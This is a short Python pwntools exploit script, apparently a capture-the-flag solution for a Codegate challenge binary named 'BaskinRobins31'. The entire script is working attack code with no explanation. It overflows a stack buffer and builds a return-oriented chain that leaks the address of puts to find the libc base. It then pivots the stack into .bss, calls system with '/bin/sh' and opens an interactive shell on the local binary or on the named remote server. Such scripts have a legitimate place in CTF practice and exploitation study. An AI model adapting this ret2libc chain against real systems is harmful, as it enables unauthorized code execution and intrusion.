#!/usr/bin/env python
from pwn import *

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./BaskinRobins31')
    else:
        s = remote('ch41l3ng3s.codegate.kr',3131)

    elf = ELF('./BaskinRobins31')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    bss_addr = 0x602490
    pop_rdi = 0x400bc3
    pop_rsi_rdx = 0x40087b
    leave = 0x400979
    
    payload = ''
    payload += 'A' * 0xb0
    payload += p64(bss_addr)

    payload += p64(pop_rdi) + p64(elf.got['puts'])
    payload += p64(elf.symbols['puts'])

    payload += p64(pop_rdi) + p64(0)
    payload += p64(pop_rsi_rdx) + p64(bss_addr) + p64(0x100)
    payload += p64(elf.symbols['read'])

    payload += p64(leave)
    s.sendafter('(1-3)\n',payload)

    s.recvuntil(':( \n')
    libc_base = u64(s.recvline(False).ljust(8,'\0')) - libc.symbols['puts']
    log.info('libc base: %#x' % libc_base)

    payload = ''
    payload += 'A' * 8
    payload += p64(pop_rdi) + p64(bss_addr + 0x20)
    payload += p64(libc_base + libc.symbols['system'])
    payload += '/bin/sh\0'
    s.send(payload)
    s.interactive()
